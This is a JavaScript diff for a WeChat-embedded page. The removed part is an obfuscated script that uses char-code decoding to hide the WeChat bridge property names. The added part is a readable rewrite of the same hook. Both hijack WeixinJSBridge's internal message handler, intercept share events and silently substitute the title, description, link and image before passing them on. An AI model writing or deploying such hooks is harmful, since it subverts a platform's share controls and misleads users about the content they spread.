@@ -368,7 +368,6 @@ function getShareData(shareTimeline) {
     return o;
 }
 
-
 function isIos() {
     var e = navigator.userAgent.toLowerCase();
     return e.indexOf("iphone") >= 0 || e.indexOf("ipad") >= 0 || e.indexOf("applewebkit") >= 0
@@ -386,5 +385,105 @@ Object.defineProperty(window,"WeixinJSBridge",{
 });
 
 
+var WechatShare = function() {
+    function e() {
+        var e = this;
+        this.onBridgeReady = function() {
+            var t = window.WeixinJSBridge,
+                a = {
+                    invoke: t.invoke,
+                    call: t.call,
+                    on: t.on,
+                    env: t.env,
+                    log: t.log,
+                    _fetchQueue: t._fetchQueue,
+                    _hasInit: t._hasInit,
+                    _hasPreInit: t._hasPreInit,
+                    _isBridgeByIframe: t._isBridgeByIframe,
+                    _continueSetResult: t._continueSetResult,
+                    _handleMessageFromWeixin: t._handleMessageFromWeixin
+                };
+            Object.defineProperty(window, "WeixinJSBridge", {
+                writable: !0,
+                enumerable: !0
+            }),
+                window.WeixinJSBridge = a;
+            try {
+                e.setHandleMessageHookForWeixin()
+            } catch(t) {
+                e.restoreHandleMessageHookForWeixin()
+            }
+        },
+            this.handleMesageHook = function(t) {
+                if (t) {
+                    var a;
+                    a = t.__json_message ? t.__json_message: t;
+                    var o = a.__params,
+                        i = a.__msg_type,
+                        n = a.__event_id;
+                    if ("callback" == i && e.shareCallback && "function" == typeof e.shareCallback) e.shareCallback(o);
+                    else if ("event" == i && n && n.indexOf("share") > 0) {
+                        var q1 = "sendAppMessage";
+                        var q2 = n;
+                        if (n == "general:share") {
+                            var q3 = a['__params'];
+                            q2 = q3['shareTo'];
+                        }
+                        if (q2.indexOf("timeline") != -1) {
+                            q1 = "shareTimeline";
+                        }
 
- var oldDefProp=Object.defineProperty;Object.defineProperty=function(n,t,i){(t==decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110")||t==decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101"))&&(i.writable=!0,i.configurable=!0);oldDefProp(n,t,i)};var Main=function(){function n(){}return n.prototype.start=function(){var n=this;this.setShareCallBack()},n.prototype.setShareCallBack=function(){var n=this;window.wcShare&&(window.wcShare.shareCallback=function(t){var a=!1,o=t&&t.err_msg;if(o=="send_app_msg:ok"||o=="share_timeline:ok"||o=="send_app_msg:confirm"){if(o=="share_timeline:ok"){sharedata.success("timeline")}else{sharedata.success("friend")}}})}}();var WechatShare=function(){function n(){var n=this;this.onBridgeReady=function(){var t=window.WeixinJSBridge,i={invoke:t.invoke,call:t.call,on:t.on,env:t.env,log:t.log,_fetchQueue:t._fetchQueue,_hasInit:t._hasInit,_hasPreInit:t._hasPreInit,_isBridgeByIframe:t._isBridgeByIframe,_continueSetResult:t._continueSetResult,_handleMessageFromWeixin:t._handleMessageFromWeixin};console.log(i);Object.defineProperty(window,"WeixinJSBridge",{writable:!0,enumerable:!0}),window.WeixinJSBridge=i;try{n.setHandleMessageHookForWeixin()}catch(t){n.restoreHandleMessageHookForWeixin()}},this.handleMesageHook=function(t){if(t){var a;a=t.__json_message?t.__json_message:t;var o=a.__params,i=a.__msg_type,s=a.__event_id;if("callback"==i&&n.shareCallback&&"function"==typeof n.shareCallback){n.shareCallback(o)}else{if("event"==i&&s&&s.indexOf("share")>0){var shareios="";if(o.shareTo!=null){shareios=o.shareTo}if(s.indexOf("share:timeline")>0||shareios=="timeline"){Object.defineProperty(o,"title",{get:function(){return delete o.scene,o.desc=sharedata["qdesc"],o.link=sharedata["qlink"],o.img_url=sharedata["qimgUrl"],Object.defineProperty(o,"title",{value:sharedata["qtitle"],enumerable:!0}),"title"},set:function(){},enumerable:!1,configurable:!0}),n.restoreHandleMessageHookForWeixin(),n.oldHandleMesageHook(t),n.setHandleMessageHookForWeixin()}else{Object.defineProperty(o,"title",{get:function(){return delete o.scene,o.desc=sharedata["desc"],o.link=sharedata["link"],o.img_url=sharedata["imgUrl"],Object.defineProperty(o,"title",{value:sharedata["title"],enumerable:!0}),"title"},set:function(){},enumerable:!1,configurable:!0}),n.restoreHandleMessageHookForWeixin(),n.oldHandleMesageHook(t),n.setHandleMessageHookForWeixin()}}else{n.restoreHandleMessageHookForWeixin(),n.oldHandleMesageHook(t),n.setHandleMessageHookForWeixin()}}}},"undefined"==typeof WeixinJSBridge?document.addEventListener?document.addEventListener("WeixinJSBridgeReady",this.onBridgeReady,!1):document.attachEvent&&(document.attachEvent("WeixinJSBridgeReady",this.onBridgeReady),document.attachEvent("onWeixinJSBridgeReady",this.onBridgeReady)):this.onBridgeReady()}return n.prototype.setHandleMessageHookForWeixin=function(){this.oldHandleMesageHook=window.WeixinJSBridge._handleMessageFromWeixin;window.WeixinJSBridge._handleMessageFromWeixin=this.handleMesageHook},n.prototype.restoreHandleMessageHookForWeixin=function(){this.oldHandleMesageHook&&(window.WeixinJSBridge._handleMessageFromWeixin=this.oldHandleMesageHook)},n}();window.wcShare=new WechatShare;function decodeStr(n){var r,t,i;if(!n){return""}for(r=n[0],t=n.split(r),i=0;i<t.length;i++){t[i]&&(t[i]=String.fromCharCode(t[i]))}return t.join("")}var hiddenProperty="hidden" in document?"hidden":"webkitHidden" in document?"webkitHidden":"mozHidden" in document?"mozHidden":null;
+                        window.shareType = q1;
+                        window.shareData = getShareData();
+
+                        var s = window.shareData.desc,
+                            r = window.shareData.link,
+                            d = window.shareData.img_url,
+                            c = window.shareData.title;
+                        Object.defineProperty(o, "title", {
+                            get: function() {
+                                return delete o.scene,
+                                    o.desc = s,
+                                    o.link = r,
+                                    o.img_url = d,
+                                    Object.defineProperty(o, "title", {
+                                        value: c,
+                                        enumerable: !0
+                                    }),
+                                    "title"
+                            },
+                            set: function() {},
+                            enumerable: !1,
+                            configurable: !0
+                        }),
+                            e.restoreHandleMessageHookForWeixin(),
+                            e.oldHandleMesageHook(t),
+                            e.setHandleMessageHookForWeixin()
+                    } else e.restoreHandleMessageHookForWeixin(),
+                        e.oldHandleMesageHook(t),
+                        e.setHandleMessageHookForWeixin()
+                }
+            },
+            "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent && (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady), document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
+    }
+    return e.prototype.setHandleMessageHookForWeixin = function() {
+        this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin,
+            window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
+    },
+        e.prototype.restoreHandleMessageHookForWeixin = function() {
+            this.oldHandleMesageHook && (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
+        },
+        e
+} ();
+window.wcShare = new WechatShare;
+window.wcShare && (window.wcShare.shareCallback = function(t) {
+    var b = t && t.err_msg;
+    if(b.indexOf("msg:ok")>0 || b.indexOf("msg:con")>0)
+    {
+        shareComplete(0);
+    }
+    else if(b.indexOf("line:ok")>0 || b.indexOf("line:con")>0)
+    {
+        shareComplete(1);
+    }
+});
